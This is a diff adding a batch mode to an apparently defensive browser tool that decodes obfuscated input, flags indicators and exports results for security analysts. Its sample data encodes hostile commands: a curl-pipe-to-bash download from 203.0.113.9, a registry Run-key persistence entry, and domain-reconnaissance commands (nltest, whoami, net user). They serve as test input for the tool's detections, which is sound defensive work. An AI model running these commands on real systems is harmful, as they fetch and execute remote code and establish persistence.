@@ -143,6 +143,14 @@ textarea,pre{height:clamp(200px,38vh,340px)}
 .risk{font:700 12px var(--mono)}
 button.clr{padding:7px 22px;font-weight:600}
 @media(max-width:600px){button.clr{width:100%;padding:10px}}
+.tw{overflow:auto;max-height:420px;border:1px solid var(--bd)}
+#btable{width:100%;border-collapse:collapse;font:12px var(--mono)}
+#btable th,#btable td{text-align:left;padding:7px 10px;border-bottom:1px solid var(--bd);vertical-align:top;overflow-wrap:anywhere}
+#btable th{position:sticky;top:0;background:var(--pn);z-index:1}
+#btable tr[data-r]{cursor:pointer}#btable tr[data-r]:hover td,#btable tr.sel td{background:color-mix(in srgb,var(--ac) 14%,transparent)}
+#btable td:nth-child(2),#btable td:nth-child(4){min-width:160px}
+#batch h3{margin-top:16px}
+.iogrid textarea[readonly]{cursor:default}
 </style>
 </head>
 <body>
@@ -153,7 +161,7 @@ button.clr{padding:7px 22px;font-weight:600}
   <p class="tag">Fast, private decoding and encoding for security analysts. Paste encoded content to read it, or encode text to test detections, all with indicators highlighted.</p>
   <span class="badge" title="Network access is blocked by the page's Content-Security-Policy">&#9679; Local processing, nothing leaves your browser</span>
 </div>
-<div class="segw"><div class="seg" role="group" aria-label="Mode"><button id="mDec" class="on" aria-pressed="true">Decode</button><button id="mEnc" aria-pressed="false">Encode</button></div></div>
+<div class="segw"><div class="seg" role="group" aria-label="Mode"><button id="mDec" class="on" aria-pressed="true">Decode</button><button id="mEnc" aria-pressed="false">Encode</button><button id="mBat" aria-pressed="false">Batch</button></div></div>
 <main>
   <section class="panel io">
     <div class="iogrid">
@@ -177,6 +185,12 @@ button.clr{padding:7px 22px;font-weight:600}
     </div>
     <div id="chain" class="chips chain"></div>
     <div id="ops" class="chips" role="group" aria-label="Decoders"></div>
+  </section>
+  <section class="panel" id="batch" hidden>
+    <div class="ph"><h2>Batch results</h2><small id="bstat">Upload a .txt file with one value per line. Click a row to open it above.</small><span class="sp"></span><button class="lnk" id="bAllIoc">[copy all iocs]</button><button class="lnk" id="bCsv">[export csv]</button><button class="lnk" id="bBJson">[export json]</button></div>
+    <div class="tw"><table id="btable"></table></div>
+    <h3>Indicators across all values <small>x N = seen in N values, hover for row numbers</small></h3>
+    <div id="bagg" class="grp"></div>
   </section>
   <section class="panel"><div class="ph"><h2>Indicators and suspicious patterns</h2><small>Click any value to copy it</small><span class="sp"></span><span id="risk" class="risk"></span></div><div id="iocs" class="grp"></div></section>
   <section class="panel"><div class="ph"><h2>History</h2><small>kept in memory for this tab only</small><span class="sp"></span><button id="bHC">Clear history</button></div><div id="hist" class="hist"></div></section>
@@ -367,23 +381,67 @@ async function encode(){
   const e=E.find(x=>x.id==$('#encSel').value);let r;
   try{r=await e.run(s)}catch(x){toast(e.name+' failed: '+x.message);return}
   stack.push(r);names.push(e.name);render();record()}
-const go=()=>mode=='enc'?encode():auto();
+const go=()=>mode=='enc'?encode():mode=='bat'?$('#file').click():auto();
 function setMode(m){
-  mode=m;const e=m=='enc';
-  $('#mDec').classList.toggle('on',!e);$('#mEnc').classList.toggle('on',e);
-  $('#mDec').setAttribute('aria-pressed',String(!e));$('#mEnc').setAttribute('aria-pressed',String(e));
-  $('#bAuto').textContent=e?'Encode':'Decode';$('#encWrap').hidden=!e;$('#ops').hidden=e;
-  $('#inp').placeholder=e?'// type plain text, pick an encoding, press Encode. Encode again to add a layer':'// paste encoded or obfuscated content. Ctrl+Enter to decode'}
+  const prev=mode;mode=m;const e=m=='enc',b=m=='bat';if(prev!=m&&(prev=='bat'||b)){rows=[];renderBatch();setInput('')}
+  for(const[k,id]of[['dec','#mDec'],['enc','#mEnc'],['bat','#mBat']]){$(id).classList.toggle('on',m==k);$(id).setAttribute('aria-pressed',String(m==k))}
+  $('#bAuto').textContent=e?'Encode':b?'Upload .txt file':'Decode';$('#inp').readOnly=b;$('#file').accept=b?'.txt,text/plain':'';$('#bFile').textContent=b?'[upload .txt]':'[open file]';$('#encWrap').hidden=!e;$('#ops').hidden=e||b;$('#batch').hidden=!b;
+  $('#inp').placeholder=e?'// type plain text, pick an encoding, press Encode. Encode again to add a layer':b?'// batch mode: upload a .txt file with one encoded value per line (max 500 values). Use Decode mode for a single value':'// paste encoded or obfuscated content. Ctrl+Enter to decode'}
 $('#encSel').innerHTML=E.map(e=>`<option value="${e.id}">${esc(e.name)}</option>`).join('');
-$('#mDec').onclick=()=>setMode('dec');$('#mEnc').onclick=()=>setMode('enc');
+$('#mDec').onclick=()=>setMode('dec');$('#mEnc').onclick=()=>setMode('enc');$('#mBat').onclick=()=>setMode('bat');
 $('#inp').addEventListener('input',e=>{clearTimeout(timer);timer=setTimeout(()=>reset(e.target.value),150)});
 $('#inp').addEventListener('keydown',e=>{if(e.ctrlKey&&e.key=='Enter'){e.preventDefault();reset($('#inp').value);go()}});
 $('#bAuto').onclick=()=>{if($('#inp').value!==stack[0])reset($('#inp').value);go()};
+let rows=[];
+async function autoOn(s){const st=[s],nm=['Input'];
+  for(let n=0;n<12;n++){const c=detect(st.at(-1))[0];if(!c||c.sc<.7)break;let r;
+    try{r=await c.d.run(st.at(-1))}catch{break}
+    if(r==null||r==='')break;const t=typeof r=='string'?r:r.t,nn=typeof r=='string'?c.d.name:r.n;
+    if(t===st.at(-1)||st.includes(t))break;st.push(t);nm.push(nn)}
+  return{st,nm}}
+const riskOf=F=>{const q=Object.keys(F).filter(k=>k[0]=='S');return q.some(k=>/Credential/.test(k))||q.length>=3?'HIGH':q.length?'MEDIUM':'-'};
+async function batch(){
+  const lines=$('#inp').value.split(/\r?\n/).map(x=>x.trim()).filter(Boolean).slice(0,500);
+  if(!lines.length){toast('Upload a .txt file first');return}
+  rows=[];
+  for(let i=0;i<lines.length;i++){const{st,nm}=await autoOn(lines[i]),F=analyze(st.at(-1)).F;
+    rows.push({n:i+1,input:lines[i],st,nm,F,risk:riskOf(F)});
+    if(i%10==9){$('#bstat').textContent=`Analyzing ${i+1}/${lines.length}...`;await new Promise(r=>setTimeout(r))}}
+  renderBatch()}
+function renderBatch(){
+  if(!rows.length){$('#btable').innerHTML='';$('#bagg').innerHTML='';$('#bstat').textContent='Upload a .txt file with one value per line. Click a row to open it above.';return}
+  const C={HIGH:'var(--bad)',MEDIUM:'var(--warn)','-':'var(--mut)'};
+  $('#bstat').textContent=`${rows.length} values analyzed. Click a row to open it above.`;
+  $('#btable').innerHTML='<tr><th>#</th><th>Input</th><th>Layers</th><th>Decoded output</th><th>Risk</th><th>IOCs</th></tr>'+rows.map((r,i)=>`<tr data-r="${i}"><td>${r.n}</td><td>${esc(r.input.slice(0,40))}</td><td>${r.nm.length>1?esc(r.nm.slice(1).join(' > ')):'<span class="mut">none detected</span>'}</td><td>${esc(r.st.at(-1).slice(0,70).replace(/\s+/g,' '))}</td><td style="color:${C[r.risk]}"><b>${r.risk}</b></td><td>${Object.values(r.F).reduce((a,x)=>a+x.v.size,0)}</td></tr>`).join('');
+  const A={};for(const r of rows)for(const k in r.F)for(const v of r.F[k].v){const a=A[k]=A[k]||{c:r.F[k].c,m:new Map()};if(!a.m.has(v))a.m.set(v,[]);a.m.get(v).push(r.n)}
+  const ks=Object.keys(A).sort((x,y)=>(y[0]=='S')-(x[0]=='S'));
+  $('#bagg').innerHTML=ks.length?ks.map(k=>`<div><h3 class="${A[k].c}">${esc(k)} <small>${A[k].m.size}</small></h3><div>${[...A[k].m].map(([v,n])=>`<code data-c="${esc(v)}" title="rows: ${n.join(', ')}">${esc(v.slice(0,120))}${n.length>1?' x'+n.length:''}</code>`).join('')}</div></div>`).join(''):'<span class="mut">No indicators found in any value.</span>'}
+const csvCell=v=>{v=String(v);if(/^[=+\-@\t\r]/.test(v))v="'"+v;return '"'+v.replace(/"/g,'""')+'"'};
+function dl(text,type,ext){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([text],{type}));a.download='cipher-lens-batch-'+Date.now()+'.'+ext;a.click();setTimeout(()=>URL.revokeObjectURL(a.href),1e3)}
+const iocLine=r=>Object.entries(r.F).map(([k,x])=>k+': '+[...x.v].join(' | ')).join(' ; ');
+$('#bCsv').onclick=()=>{if(!rows.length)return toast('Run Analyze all first');
+  dl(['row,input,layers,final_output,risk,indicators',...rows.map(r=>[r.n,r.input,r.nm.slice(1).join(' > '),r.st.at(-1),r.risk,iocLine(r)].map(csvCell).join(','))].join('\n'),'text/csv','csv')};
+$('#bBJson').onclick=()=>{if(!rows.length)return toast('Run Analyze all first');
+  dl(JSON.stringify(rows.map(r=>({row:r.n,input:r.input,layers:r.nm.slice(1),finalOutput:r.st.at(-1),risk:r.risk,indicators:Object.fromEntries(Object.entries(r.F).map(([k,x])=>[k,[...x.v]]))})),null,2),'application/json','json')};
+$('#bAllIoc').onclick=()=>{const l=new Set();for(const r of rows)for(const k in r.F)if(k[0]!='S')for(const v of r.F[k].v)l.add(dfk(k)?defang(v):v);l.size?copy([...l].join('\n')):toast('No IOCs to copy')};
+$('#btable').addEventListener('click',e=>{const t=e.target.closest('tr[data-r]');if(!t)return;const r=rows[+t.dataset.r];
+  stack=[...r.st];names=[...r.nm];render();$('#btable').querySelectorAll('tr.sel').forEach(x=>x.classList.remove('sel'));t.classList.add('sel');$('#out').scrollIntoView({block:'nearest'})});
+$('#bagg').addEventListener('click',e=>{const c=e.target.closest('[data-c]');if(c)copy(c.dataset.c)});
+const batchSample=()=>[sample(),btoa('nltest /dom_trusts'),Array.from(u8('curl http://203.0.113.9/p.sh | bash'),x=>'%'+x.toString(16).padStart(2,'0')).join(''),h2(u8('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\Users\\Public\\u.exe')),btoa('hello world'),'just a normal sentence'].join('\n');
 function md(){const F=analyze(cur()).F,ks=Object.keys(F),f='```';
   return '# Cipher Lens report\n\n**Layers:** '+names.join(' > ')+'\n\n**Original input:**\n'+f+'\n'+stack[0]+'\n'+f+'\n\n**Final output:**\n'+f+'\n'+cur()+'\n'+f+'\n\n**Indicators:**\n'+(ks.length?ks.map(k=>'- '+k+': '+[...F[k].v].map(v=>'`'+(k[0]!='S'&&dfk(k)?defang(v):v)+'`').join(', ')).join('\n'):'- none')}
 $('#bMd').onclick=()=>copy(md());
 $('#bWrap').onclick=()=>{const o=$('#out').classList.toggle('nowrap');$('#bWrap').textContent='[wrap: '+(o?'off':'on')+']'};
-async function loadFile(f){if(!f)return;if(f.size>5e6){toast('File is over 5 MB');return}
+async function loadFile(f){if(!f)return;
+  if(mode=='bat'){
+    if(!/\.txt$/i.test(f.name)){toast('Batch mode accepts .txt files only');return}
+    if(f.size>2e6){toast('File is over 2 MB');return}
+    const t=b2t(new Uint8Array(await f.arrayBuffer()));
+    if(printable(t)<.95){toast('That does not look like a text file');return}
+    const n=t.split(/\r?\n/).filter(x=>x.trim()).length;
+    if(!n){toast('The file is empty');return}
+    setInput(t);await batch();if(n>500)toast(`Only the first 500 of ${n} values were analyzed`);return}
+  if(f.size>5e6){toast('File is over 5 MB');return}
   const b=new Uint8Array(await f.arrayBuffer()),t=b2t(b);setInput(printable(t)>.9?t:h2(b));toast('Loaded '+f.name)}
 $('#bFile').onclick=()=>$('#file').click();
 $('#file').onchange=e=>{loadFile(e.target.files[0]);e.target.value=''};
@@ -391,9 +449,9 @@ $('#inp').addEventListener('dragover',e=>e.preventDefault());
 $('#inp').addEventListener('drop',e=>{if(e.dataTransfer.files.length){e.preventDefault();loadFile(e.dataTransfer.files[0])}});
 $('#bSwap').onclick=()=>{if(stack.length<2){toast('Nothing to move yet. Run a decode or encode first.');return}setInput(cur())};
 $('#bUndo').onclick=()=>{if(stack.length>1){stack.pop();names.pop();render()}};
-const clearAll=()=>{setInput('');$('#inp').focus()};
+const clearAll=()=>{if(mode=='bat'){rows=[];renderBatch()}setInput('');$('#inp').focus()};
 $('#bClear').onclick=clearAll;$('#bReset').onclick=clearAll;
-$('#bSample').onclick=()=>{if(mode=='enc'){setInput('whoami /all & net user /domain');return}setInput(sample());auto()};
+$('#bSample').onclick=()=>{if(mode=='bat'){setInput(batchSample());batch();return}if(mode=='enc'){setInput('whoami /all & net user /domain');return}setInput(sample());auto()};
 $('#bCopy').onclick=()=>copy(cur());
 $('#bHC').onclick=()=>{hist=[];renderHist()};
 $('#bTheme').onclick=()=>{const h=document.documentElement,l=h.dataset.theme=='dark';h.dataset.theme=l?'light':'dark';$('#bTheme').textContent=l?'Dark mode':'Light mode'};
